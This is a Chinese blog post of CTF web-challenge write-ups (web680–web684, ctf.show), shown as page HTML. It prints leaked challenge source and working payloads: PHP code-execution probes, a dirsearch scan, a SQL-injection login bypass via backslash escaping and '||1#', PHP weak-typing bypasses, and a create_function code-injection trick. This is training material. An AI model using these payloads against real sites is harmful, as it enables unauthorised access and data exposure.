<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="web680code&#x3D;phpinfo();先看下disable_function，有一堆过滤。并且open_basedir做了目录限制 123payload: ?code&#x3D;var_dump(scandir(&amp;#x27;.&amp;#x27;));code&#x3D;highlight_file(&amp;#x27;secret_you_never_know&amp;#x27;);  web681类型：源码泄露 .svn可以获得源码">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF大赛原题">
<meta property="og:url" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/index.html">
<meta property="og:site_name" content="Echo">
<meta property="og:description" content="web680code&#x3D;phpinfo();先看下disable_function，有一堆过滤。并且open_basedir做了目录限制 123payload: ?code&#x3D;var_dump(scandir(&amp;#x27;.&amp;#x27;));code&#x3D;highlight_file(&amp;#x27;secret_you_never_know&amp;#x27;);  web681类型：源码泄露 .svn可以获得源码">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331202817135.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331205843602.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331211454709.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402202305918.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402203012134.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220314207.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220346449.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220411202.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402221343218.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402225225932.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144141565.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144513418.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144433732.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403152209581.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161536068.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161806446.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161937347.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403162544863.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403162829419.png">
<meta property="og:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220321211220453.png">
<meta property="article:published_time" content="2022-03-31T07:30:16.000Z">
<meta property="article:modified_time" content="2022-04-03T11:47:10.099Z">
<meta property="article:author" content="CJ">
<meta property="article:tag" content="STUDY">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331202817135.png">


<link rel="canonical" href="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/","path":"2022/03/31/CTF大赛原题/","title":"CTF大赛原题"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>CTF大赛原题 | Echo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Echo</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web680"><span class="nav-number">1.</span> <span class="nav-text">web680</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web681"><span class="nav-number">2.</span> <span class="nav-text">web681</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web682"><span class="nav-number">3.</span> <span class="nav-text">web682</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web683"><span class="nav-number">4.</span> <span class="nav-text">web683</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web684"><span class="nav-number">5.</span> <span class="nav-text">web684</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web686"><span class="nav-number">6.</span> <span class="nav-text">web686</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web687"><span class="nav-number">7.</span> <span class="nav-text">web687</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web688"><span class="nav-number">8.</span> <span class="nav-text">web688</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%B3%BB%E5%88%97"><span class="nav-number">9.</span> <span class="nav-text">web系列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">10.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">11.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">12.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">13.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">14.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">15.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">16.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web9"><span class="nav-number">17.</span> <span class="nav-text">web9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web10"><span class="nav-number">18.</span> <span class="nav-text">web10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web11"><span class="nav-number">19.</span> <span class="nav-text">web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web12"><span class="nav-number">20.</span> <span class="nav-text">web12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%BA%A2%E5%8C%85%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="nav-number">21.</span> <span class="nav-text">web红包第二弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web13"><span class="nav-number">22.</span> <span class="nav-text">web13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web14"><span class="nav-number">23.</span> <span class="nav-text">web14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctfshow-web1"><span class="nav-number">24.</span> <span class="nav-text">ctfshow web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%88%87%E7%9C%8B%E8%B5%B7%E6%9D%A5%E9%83%BD%E9%82%A3%E4%B9%88%E5%90%88%E6%83%85%E5%90%88%E7%90%86"><span class="nav-number">25.</span> <span class="nav-text">一切看起来都那么合情合理</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CJ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CTF大赛原题
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-31 15:30:16" itemprop="dateCreated datePublished" datetime="2022-03-31T15:30:16+08:00">2022-03-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-03 19:47:10" itemprop="dateModified" datetime="2022-04-03T19:47:10+08:00">2022-04-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>27k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>24 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="web680"><a href="#web680" class="headerlink" title="web680"></a>web680</h2><p>code=phpinfo();先看下disable_function，有一堆过滤。并且open_basedir做了目录限制</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: ?<span class="keyword">code</span>=var_dump(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">code</span>=highlight_file(<span class="string">&#x27;secret_you_never_know&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web681"><a href="#web681" class="headerlink" title="web681"></a>web681</h2><p>类型：源码泄露 .svn可以获得源码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span>扫描：dirsearch -u http://d<span class="number">8</span>bd<span class="number">48</span>e<span class="number">1</span>-<span class="number">56</span>ad-<span class="number">4</span>fb<span class="number">3</span>-ba<span class="number">03</span>-<span class="number">3072811794</span>c<span class="number">8</span>.challenge.ctf.show/ -t <span class="number">4</span> -e php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-09-24 14:58:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-09-24 16:04:49</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"> </span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">  <span class="variable">$name</span> = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>, trim(waf(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])));<span class="comment">//这里会将传入的参数去单引号，并且要过waf。</span></span><br><span class="line">  <span class="keyword">if</span> (strlen(<span class="variable">$name</span>) &gt; <span class="number">11</span>)&#123; <span class="comment">//这里长度不能大于11</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;name too long&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_users where username = &#x27;<span class="subst">$name</span>&#x27; or nickname = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;  <span class="comment">//这里存在sql注入，要点是</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> db();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;select_one_array(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="number">0</span>])&#123;  <span class="comment">//只要传入为true就会返回flag</span></span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;good job&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得出空格被过滤可以使用/**/绕过</p>
<p>单引号过滤可以使用“\”绕过</p>
<p>或者登录的时候抓包，比如我们传name=123会返回sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;123&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span> <span class="string">&#x27;123&#x27;</span></span><br><span class="line">然后试了下单引号，发现会被吞。</span><br><span class="line">那就试下反斜杠，</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;123\&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span> <span class="string">&#x27;123\&#x27;</span></span><br><span class="line">这样相当于执行</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span><span class="number">123</span>\<span class="string">&#x27;      xxx：123\&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span></span><br><span class="line">所以先整个万能密码</span><br><span class="line">name<span class="operator">=</span><span class="operator">||</span><span class="number">1</span>#   或者<span class="keyword">or</span>(<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span>   记得加\</span><br><span class="line">注释前需要闭合前面引号，否则注释符会被当做引号里的字符</span><br><span class="line">最终语句为</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;||1#\&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span> <span class="string">&#x27;||1#\&#x27;</span></span><br><span class="line">相当于   </span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;xxxxx‘||1#\&#x27;</span></span><br><span class="line">然后就出flag了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web682"><a href="#web682" class="headerlink" title="web682"></a>web682</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/122998220">详见</a></p>
<h2 id="web683"><a href="#web683" class="headerlink" title="web683"></a>web683</h2><p>类型：php特性，弱类型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-09-24 17:34:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-09-24 20:32:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>]))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;必须是数字&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;你太短了&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;你太长了&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           sleep((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>]);</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>秀要大于60 * 60 * 24 * 30 * 2，同时int后时间不能太久sleep((int)$_GET[‘秀’]);</p>
<p>payload：秀=0.7e7 =7000000 int后=0.7</p>
<p>或者16进制绕过：?秀=0x76a699</p>
<h2 id="web684"><a href="#web684" class="headerlink" title="web684"></a>web684</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123; <span class="comment">//传入的参数不能有a-z0-9，这里只能识别一行只需要换行就能绕过正则</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);  <span class="comment">//这里可以使用create_function() 函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不用字母数字以及下划线的情况下如何调用函数，看到 <code>^$</code> 应该想到 fuzz 一下开头和结尾的特殊字符的，正确的解法是在函数前面\或者%5c,<code>\function</code>。P牛在小密圈给出的解释是：</p>
<p>奇技淫巧 其实简单的不行，php里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
<p>接下来需要找到某个函数第二个参数可控时可以利用的。函数<code>create_function()</code>非常合适，这里做一下记录<a target="_blank" rel="noopener" href="http://blog.51cto.com/lovexm/1743442">create_function()代码注入</a></p>
